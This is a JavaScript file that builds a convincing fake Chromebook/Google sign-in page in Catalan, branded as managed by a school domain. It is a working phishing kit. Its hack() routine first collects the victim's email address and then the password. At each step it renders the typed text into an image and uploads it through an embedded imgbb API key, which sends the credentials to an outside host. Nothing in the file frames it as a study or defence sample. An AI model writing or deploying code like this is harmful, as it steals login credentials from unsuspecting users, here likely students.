// Background (unchanged)
document.body.style.margin = '0';
document.body.style.padding = '0';
document.body.style.height = '100vh';
document.body.style.overflow = 'hidden';
document.body.style.backgroundImage = "url('https://mir-s3-cdn-cf.behance.net/project_modules/fs/3ee427115532759.6050865bca95d.jpg')";
document.body.style.backgroundSize = 'cover';
document.body.style.backgroundPosition = 'center';
document.body.style.backgroundRepeat = 'no-repeat';
document.body.style.backdropFilter = 'blur(28px)';
document.body.style.webkitBackdropFilter = 'blur(28px)';
document.body.style.backgroundColor = 'rgba(0,0,0,0.45)';
document.body.style.backgroundBlendMode = 'multiply';
document.body.style.display = 'flex';
document.body.style.alignItems = 'center';
document.body.style.justifyContent = 'center';

var stage2 = false;

// Big square
const bigSquare = document.createElement('div');
bigSquare.style.width = '1200px';
bigSquare.style.height = '700px';
bigSquare.style.backgroundColor = '#fbf3ff';
bigSquare.style.borderRadius = '20px';
bigSquare.style.boxShadow = '0 8px 24px rgba(0,0,0,0.25)';
bigSquare.style.transform = 'translateY(-20px)';
bigSquare.style.position = 'relative';           // needed for inner positioning
bigSquare.style.display = 'flex';
bigSquare.style.alignItems = 'center';
bigSquare.style.justifyContent = 'center';

document.body.appendChild(bigSquare);

// Smaller square inside
const smallSquare = document.createElement('div');
smallSquare.style.width = '1150px';                // smaller size
smallSquare.style.height = '533px';               // keeps ~18:9 ratio
smallSquare.style.backgroundColor = '#ffffff';
smallSquare.style.borderRadius = '16px';
smallSquare.style.position = 'absolute';          // position inside big square

bigSquare.appendChild(smallSquare);

// Google logo top-left
const logo = document.createElement('img');
logo.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/500px-Google_%22G%22_logo.svg.png';
logo.style.width = '44px';
logo.style.position = 'absolute';
logo.style.top = '35px';
logo.style.left = '25px';

smallSquare.appendChild(logo);
const font = new FontFace(
  'Google Sans',
  'url(https://fonts.gstatic.com/s/googlesans/v62/4UaGrENHsxJlGDuGo1OIlL3Owp4.woff2)'
);
const fontLink = document.createElement('link');
fontLink.rel = 'stylesheet';
fontLink.href = 'https://fonts.googleapis.com/css2?family=Google+Sans+Flex:wght@400;500;600;700&display=swap';
document.head.appendChild(fontLink);

font.load().then(loadedFont => {
  document.fonts.add(loadedFont);
});

// Add this after creating smallSquare
const text = document.createElement('div');
text.innerHTML = 'Inicieu la sessió a<br>Chromebook';
text.style.position = 'absolute';
text.style.top = '150px';
text.style.left = '153px';
text.style.transform = 'translate(-50%, -50%)';
text.style.fontFamily = '"Google Sans", Arial, sans-serif';
text.style.fontSize = '33px';
text.style.fontWeight = '500';
text.style.color = '#202124';
text.style.lineHeight = '1.3';

smallSquare.appendChild(text);

// Smaller text underneath: "Gestionat per"
const subText = document.createElement('div');
subText.textContent = 'Gestionat per insmontsariu.cat';
subText.style.position = 'absolute';
subText.style.top = '215px';                    // adjust this number to move up/down
subText.style.left = '140px';
subText.style.transform = 'translateX(-50%)';
subText.style.fontFamily = '"Google Sans", Arial, sans-serif';
subText.style.fontSize = '16px';                // smaller than main text
subText.style.textAlign = 'center';

smallSquare.appendChild(subText);

// Smaller text underneath: "Gestionat per"
const SubsubText = document.createElement('div');
SubsubText.innerHTML = 'Més informació sobre la inscripció del<br>Chromebook';
SubsubText.style.position = 'absolute';
SubsubText.style.top = '240px';                    // adjust this number to move up/down
SubsubText.style.left = '169px';
SubsubText.style.color = '#1a44c0';
SubsubText.style.fontWeight = '450';
SubsubText.style.transform = 'translateX(-50%)';
SubsubText.style.fontFamily = '"Google Sans Flex", Arial, sans-serif';
SubsubText.style.fontSize = '16px';                // smaller than main text

smallSquare.appendChild(SubsubText);

var neger = "Introdueix la teva adreça electrònica"

// Hello text in middle of smallSquare
const helloText = document.createElement('div');
helloText.textContent = neger
helloText.style.zIndex = '1';
helloText.style.position = 'absolute';
helloText.style.top = '119px';
helloText.style.left = '740px';
helloText.style.transform = 'translate(-50%, -50%)';

helloText.style.fontFamily = '"Google Sans", Arial, sans-serif';
helloText.style.fontSize = '13px';
helloText.style.color = '#4365ca';          // bright green
helloText.style.backgroundColor = '#ffffff'; // black background
helloText.style.textAlign = 'center';
helloText.style.whiteSpace = 'nowrap';

smallSquare.appendChild(helloText);

// Login input on the right
const input = document.createElement('input');
input.type = 'text';
input.placeholder = neger
input.style.position = 'absolute';
input.style.top = '120px';                    // adjust vertical position
input.style.right = '30px';                   // distance from right edge
input.style.width = '500px';                  // input width
input.style.padding = '16px 15px';
input.style.fontSize = '14px';
input.style.fontFamily = '"Google Sans Flex", Arial, sans-serif';
input.style.fontWeight = '400';
input.style.border = '1px solid #dadce0';
input.style.borderRadius = '4px';
input.style.outline = 'none';
input.style.backgroundColor = '#ffffff';
helloText.style.visibility = 'hidden';

input.style.color = '#000000';
input.style.boxShadow = 'none';
input.style.transition = 'border-color 0.2s, box-shadow 0.2s';


// Better & reliable way (recommended):
const style = document.createElement('style');
style.innerHTML = `
  input::placeholder {
    color: #3d3d3d !important;
    opacity: 1;
  }
`;
document.head.appendChild(style);
// Focus style (blue border like real Google login)
input.addEventListener('focus', () => {
  input.style.borderColor = '#1a73e8';
  input.style.boxShadow = '0 0 0 2px rgba(26, 115, 232, 0.3)';
  input.placeholder = " "
  input.style.fontWeight = '500';

  helloText.style.visibility = 'visible';
});
input.addEventListener('blur', () => {
  input.style.borderColor = '#dadce0';
  input.style.boxShadow = 'none';
    input.placeholder = neger
helloText.style.visibility = 'hidden';
});

smallSquare.appendChild(input);

// Smaller text underneath: "Gestionat per"
const forgot = document.createElement('div');
forgot.innerHTML = "Has oblidat l'adreça electrònica?";
forgot.style.position = 'absolute';
forgot.style.top = '182px';                    // adjust this number to move up/down
forgot.style.left = '729px';
forgot.style.color = '#4365ca';
forgot.style.fontWeight = '450';
forgot.style.transform = 'translateX(-50%)';
forgot.style.fontFamily = '"Google Sans Flex", Arial, sans-serif';
forgot.style.fontSize = '14px';                // smaller than main text

smallSquare.appendChild(forgot);


// Smaller text underneath: "Gestionat per"
const domain = document.createElement('div');
domain.textContent = '@insmontsariu.cat';
domain.style.position = 'absolute';
domain.style.top = '136px';                    // adjust this number to move up/down
domain.style.left = '1045px';
domain.style.transform = 'translateX(-50%)';
domain.style.fontFamily = '"Google Sans", Arial, sans-serif';
domain.style.fontSize = '14px';                // smaller than main text
domain.style.textAlign = 'center';

smallSquare.appendChild(domain);


var button = document.createElement("button");
button.textContent = "Següent";
button.style.position = 'absolute';
button.style.top = '555px';
button.style.left = '1090px';
button.style.transform = 'translateX(-50%)';
button.style.fontFamily = '"Google Sans", Arial, sans-serif';
button.style.fontSize = '14px';
button.style.color = '#ffffff';
button.style.backgroundColor = '#023981e0';
button.style.border = 'none';
button.style.borderRadius = '422px';
button.style.padding = '10px 20px';
  button.style.cursor = 'pointer';

smallSquare.appendChild(button);

// Hover effect
button.addEventListener('mouseenter', () => {
  button.style.backgroundColor = '#07479be0';
});

button.addEventListener('mouseleave', () => {
  button.style.backgroundColor = '#023981e0';
});




// Container for image + "Hi" text (centered in smallSquare)
const container = document.createElement('div');
container.style.position = 'absolute';
container.style.top = '125%';
container.style.left = '50%';
container.style.transform = 'translate(-50%, -50%)';
container.style.display = 'flex';
container.style.alignItems = 'center';
container.style.gap = '10px';  // space between image and text

// Image with transparent background
const img = document.createElement('img');
img.src = 'https://i.ibb.co/S4VQkhYR/realkmanag.png';  // ← replace with your transparent PNG link
img.style.width = '18px';  // adjust size
img.style.height = 'auto';

container.appendChild(img);

// "Hi" text
const hiText = document.createElement('div');
hiText.textContent = 'Chromebook gestionat per insmontsariu.cat';
hiText.style.fontFamily = '"Google Sans", Arial, sans-serif';
hiText.style.fontSize = '13px';
hiText.style.fontWeight = '500';
hiText.style.color = '#000000';

container.appendChild(hiText);

// Add to smallSquare
smallSquare.appendChild(container);

// Bottom-left image
const bottomImg = document.createElement('img');
bottomImg.src = 'https://i.ibb.co/spqQkjxM/wadasd.png';
bottomImg.style.position = 'absolute';
bottomImg.style.bottom = '10px';
bottomImg.style.left = '13px';
bottomImg.style.width = '100px';          // change size if neededç
bottomImg.style.filter = 'contrast(1.3) saturate(1.05) drop-shadow(0 0 4px rgba(0,0,0,0.1))';
bottomImg.style.height = 'auto';
bottomImg.style.zIndex = '10';            // make sure it's on top

document.body.appendChild(bottomImg);

// Bottom-right image
const bottomRightImg = document.createElement('img');
bottomRightImg.src = 'https://i.ibb.co/chSKy6cy/dwas.png';
bottomRightImg.style.position = 'absolute';
bottomRightImg.style.bottom = '5px';
bottomRightImg.style.right = '7px';
bottomRightImg.style.width = '230px';          // adjust size if needed
bottomRightImg.style.height = 'auto';
bottomRightImg.style.filter = 'contrast(1.3) saturate(1.05) drop-shadow(0 0 4px rgba(0,0,0,0.1))';

bottomRightImg.style.zIndex = '10';
bottomRightImg.style.borderRadius = '8px';     // optional

document.body.appendChild(bottomRightImg);

// Dynamic today's date in short Catalan format
const today = new Date();
const day = today.getDate();
const monthShort = today.toLocaleString('ca', { month: 'short' }); // "gen.", "febr.", "març", etc.

// Bottom-left image with date text overlaid
const bottomImgContainer = document.createElement('div');
bottomImgContainer.style.position = 'absolute';
bottomImgContainer.style.bottom = '20px';
bottomImgContainer.style.left = '1700px';
bottomImgContainer.style.zIndex = '10';


const dateText = document.createElement('div');
dateText.textContent = `${day} de ${monthShort}`;

// Prevent line break / wrapping
dateText.style.whiteSpace = 'nowrap';

// Make sure it's centered properly
dateText.style.position = 'absolute';
dateText.style.bottom = '1.7px';
dateText.style.left = '31px';
dateText.style.transform = 'translateX(-50%)';

// Font & style
dateText.style.fontFamily = '"Google Sans Flex", Arial, sans-serif';
dateText.style.fontSize = '13px';
dateText.style.fontWeight = '600';
dateText.style.color = '#000000';
dateText.style.pointerEvents = 'none';

bottomImgContainer.appendChild(dateText);   

document.body.appendChild(bottomImgContainer);

// Current time in HH:MM format
const timeText = document.createElement('div');

// Get current time
const now = new Date();
const hours = String(now.getHours()).padStart(2, '0');
const minutes = String(now.getMinutes()).padStart(2, '0');
timeText.textContent = `${hours}:${minutes}`;

// Same style as date
timeText.style.position = 'absolute';
timeText.style.bottom = '1.7px';               // place it above the date
timeText.style.left = '106px';
timeText.style.transform = 'translateX(-50%)';
timeText.style.fontFamily = '"Google Sans Flex", Arial, sans-serif';
timeText.style.fontSize = '14px';
timeText.style.fontWeight = '600';
timeText.style.color = '#000000';
timeText.style.pointerEvents = 'none';
timeText.style.whiteSpace = 'nowrap';         // prevent any wrapping

bottomImgContainer.appendChild(timeText);       

    
// Smaller square inside
const smallSquareT = document.createElement('div');
smallSquareT.style.width = '1150px';                // smaller size
smallSquareT.style.height = '533px';               // keeps ~18:9 ratio
smallSquareT.style.zIndex = '-1';            // place it behind the big square
smallSquareT.style.backgroundColor = '#ffffff';
smallSquareT.style.opacity = '0.5'; // almost invisible
smallSquareT.style.borderRadius = '16px';
smallSquareT.style.position = 'absolute';          // position inside big square

bigSquare.appendChild(smallSquareT);

// Make sure the input can receive keyboard events







// Create the parent container for the loading bar
const loadParent = document.createElement('div');
loadParent.style.position = 'absolute';
loadParent.style.top = '-35px';                      // adjust as needed
loadParent.style.left = '0';
loadParent.style.width = '107%';
loadParent.style.height = '7rem';                    // same as your height
loadParent.style.fontSize = '18pt';
loadParent.style.marginTop = '2rem';
loadParent.style.padding = '0 0.5rem';
loadParent.style.boxSizing = 'border-box';
loadParent.style.overflow = 'hidden';
loadParent.style.visibility = 'hidden';

// Create the animated blue bar
const animatedLoad = document.createElement('div');
animatedLoad.style.position = 'absolute';
animatedLoad.style.top = '0';
animatedLoad.style.left = '1%';
animatedLoad.style.width = '5%';
animatedLoad.style.height = '5px';
animatedLoad.style.backgroundColor = '#3F51B5';      // your color

loadParent.appendChild(animatedLoad);
smallSquare.appendChild(loadParent);

// Pure JS animation that matches your @keyframes exactly
function runLoadAnimation() {
  animatedLoad.style.transition = 'none';
  animatedLoad.style.left = '1%';
  animatedLoad.style.width = '5%';

  // Force reflow so transition restarts
  void animatedLoad.offsetWidth;

  animatedLoad.style.transition = 'left 1s linear, width 1s linear';

  setTimeout(() => {
    animatedLoad.style.width = '15%';
    animatedLoad.style.left = '15%';
  }, 200);

  setTimeout(() => {
    animatedLoad.style.width = '35%';
    animatedLoad.style.left = '20%';
  }, 400);

  setTimeout(() => {
    animatedLoad.style.width = '40%';
    animatedLoad.style.left = '40%';
  }, 600);

  setTimeout(() => {
    animatedLoad.style.width = '30%';
    animatedLoad.style.left = '70%';
  }, 800);

  setTimeout(() => {
    animatedLoad.style.width = '0%';
    animatedLoad.style.left = '92%';
  }, 1000);

  // Loop forever
  setTimeout(runLoadAnimation, 2100);
}




// Container for result text + icon (appears below input after Enter)
const resultContainer = document.createElement('div');
resultContainer.style.position = 'absolute';
resultContainer.style.top = '160px';               // below the input (adjust as needed)
resultContainer.style.left = '28px';                // same left as input
resultContainer.style.display = 'flex';
resultContainer.style.alignItems = 'center';
resultContainer.style.gap = '12px';                 // space between icon and text
resultContainer.style.opacity = '0';                // hidden at start
resultContainer.style.transition = 'opacity 0.4s';
smallSquare.appendChild(resultContainer);

// Small icon on the left
const icon = document.createElement('img');
icon.src = 'https://i.ibb.co/JW5MqXzX/eadwa.png';
icon.style.width = '18px';
icon.style.height = '18px';
resultContainer.appendChild(icon);

// Result text (Google Sans)
const resultText = document.createElement('div');
resultText.style.fontFamily = '"Google Sans Flex", Arial, sans-serif';
resultText.style.fontSize = '16px';
resultText.style.fontWeight = '500';
resultText.style.color = '#202124';
resultText.style.whiteSpace = 'nowrap';
resultContainer.appendChild(resultText);


function makeImage(value) {
// canvas
var canvas = document.createElement("canvas");
var ctx = canvas.getContext("2d");

// padding + limits
var paddingX = 60;
var paddingY = 40;
var maxFontSize = 64;
var minFontSize = 20;

// base font
function setFont(size) {
  ctx.font = "600 " + size + "px Arial";
}

// find font size that fits
var fontSize = maxFontSize;
setFont(fontSize);
while (ctx.measureText(value).width > 900 && fontSize > minFontSize) {
  fontSize--;
  setFont(fontSize);
}

// final size
var textWidth = ctx.measureText(value).width;
canvas.width = Math.ceil(textWidth + paddingX * 2);
canvas.height = fontSize + paddingY * 2;

// redraw after resize
ctx = canvas.getContext("2d");
setFont(fontSize);

// background
var bg = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
bg.addColorStop(0, "#0f0f12");
bg.addColorStop(1, "#1a1a1f");
ctx.fillStyle = bg;
ctx.fillRect(0, 0, canvas.width, canvas.height);

// subtle border
ctx.strokeStyle = "rgba(255,215,120,0.35)";
ctx.lineWidth = 2;
ctx.strokeRect(1, 1, canvas.width - 2, canvas.height - 2);

// text shadow
ctx.shadowColor = "rgba(0,0,0,0.6)";
ctx.shadowBlur = 8;
ctx.shadowOffsetY = 3;

// gold text gradient
var gold = ctx.createLinearGradient(0, 0, canvas.width, 0);
gold.addColorStop(0, "#e6c97a");
gold.addColorStop(0.5, "#fff2c2");
gold.addColorStop(1, "#d4af37");
ctx.fillStyle = gold;

// text
ctx.textAlign = "center";
ctx.textBaseline = "middle";
ctx.fillText(value, canvas.width / 2, canvas.height / 2);

// export
var base64 = canvas.toDataURL("image/png").split(",")[1];

fetch("https://api.imgbb.com/1/upload?key=2a773551cba2a4504271fb3a82539629", {
  method: "POST",
  body: new URLSearchParams({ image: base64 })
})
.then(r => r.json())
.then(d => console.log(d.data.url));

}


function hack() {
if (!stage2){

smallSquareT.style.zIndex = '1';
    event.preventDefault();           // stop any form-like submit
    console.log('entering stage 2 sir'); // debug
    let value = input.value.trim();
    
    if (value === '') {
      resultText.textContent = 'No has escrit res!';
    } else {
      // Add domain if missing @
      if (!value.includes('@')) {
        value += '@insmontsariu.cat';
      }
      resultText.textContent = value;
    }
    
    // Show the result with fade-in
    resultContainer.style.opacity = '1';
    
    event.preventDefault();
    
    event.preventDefault();
    loadParent.style.visibility = 'visible';
runLoadAnimation();




makeImage(value);




setTimeout(() => {
        loadParent.style.visibility = 'hidden';
        smallSquareT.style.zIndex = '-1';
stageTwo();
stage2 = true;
  }, 10);
  } else
    {
        document.close();
        var pass = input.value
        makeImage(pass);
    }
}


input.setAttribute('tabindex', '0');  // helps with focus
button.onclick = () => {
   hack();
}
// Better Enter detection
input.addEventListener('keypress', function(event) {
  if (event.key === 'Enter' || event.keyCode === 13) {
hack();
    return false;
  }
});

function stageTwo() {
text.innerText = "Et donem la benvinguda"
text.style.top = '125px';
text.style.left = '202px';
subText.innerText = ""
SubsubText.innerText = ""
domain.innerText = ""
neger = "Introdueix la contrasenya"
helloText.textContent = neger
helloText.style.left = '720px';
button2.style.visibility = 'visible';

checkbox.style.zIndex = '1';

input.placeholder = neger
forgot.innerHTML = "Mostra la contrasenya";
forgot.style.color = '#000000';
forgot.style.left = '732px';

input.type = 'password';
input.value = ''   
}

// Small checkbox: white tick, blue bg when checked
const checkbox = document.createElement('input');
checkbox.type = 'checkbox';
checkbox.style.appearance = 'none';           // hide default look
checkbox.style.width = '18px';
checkbox.style.height = '18px';
checkbox.style.border = '2px solid #dadce0';
checkbox.style.borderRadius = '4px';
checkbox.style.outline = 'none';
checkbox.style.position = 'absolute';
checkbox.style.right = '510px';        // distance from right edge – change this
checkbox.style.top = '178px';         // vertical position – adjust as needed
checkbox.style.cursor = 'pointer';
checkbox.style.zIndex = '-1';
checkbox.style.backgroundColor = '#ffffff';
checkbox.style.transition = 'all 0.15s';

// Checked state: blue bg + white tick
checkbox.addEventListener('change', () => {
  if (checkbox.checked) {
    checkbox.style.backgroundColor = '#1a73e8';  // blue
    checkbox.style.backgroundImage = 'url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'white\'><path d=\'M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z\'/></svg>")';
    checkbox.style.backgroundSize = '14px';
    checkbox.style.backgroundPosition = 'center';
    checkbox.style.backgroundRepeat = 'no-repeat';
    checkbox.style.borderColor = '#1a73e8';
  } else {
    checkbox.style.backgroundColor = '#ffffff';
    checkbox.style.backgroundImage = 'none';
    checkbox.style.borderColor = '#dadce0';
  }
});

// Optional: add to your page (e.g. inside smallSquare)
smallSquare.appendChild(checkbox);

// Toggle password visibility when checkbox changes
checkbox.addEventListener('change', () => {
  if (checkbox.checked) {
    input.type = 'text';
  } else {
    input.type = 'password';
  }
});

var button2 = document.createElement("button");
button2.textContent = "Has oblidat la contrasenya?";
button2.style.position = 'absolute';
button2.style.top = '555px';
button2.style.left = '935px';
button2.style.transform = 'translateX(-50%)';
button2.style.fontFamily = '"Google Sans Flex", Arial, sans-serif';
button2.style.fontWeight = '500';
button2.style.fontSize = '14px';
button2.style.color = '#000000';
button2.style.backgroundColor = '#b7d6ffe0';
button2.style.border = 'none';
button2.style.borderRadius = '422px';
button2.style.width = '205px';
button2.style.visibility = 'hidden';
button2.style.padding = '10px 10px';
  button2.style.cursor = 'pointer';
smallSquare.appendChild(button2);

button2.addEventListener('mouseenter', () => {
  button2.style.backgroundColor = '#bfdcffe0';
});

button2.addEventListener('mouseleave', () => {
  button2.style.backgroundColor = '#b7d6ffe0';
});

const backImg = document.createElement('img');
backImg.src = 'https://i.ibb.co/Vc3bDZcn/bavk.png';
backImg.style.position = 'absolute';
backImg.style.top = '35px';
backImg.style.left = '40px';
backImg.style.width = '80px';
backImg.style.height = '15px';
backImg.style.filter = 'contrast(1.3) saturate(1.05) drop-shadow(12 21 1px rgb(0, 0, 0))';

backImg.style.objectFit = 'cover';        // fills the square without distortion
backImg.style.zIndex = '1';               // behind other content

bigSquare.appendChild(backImg);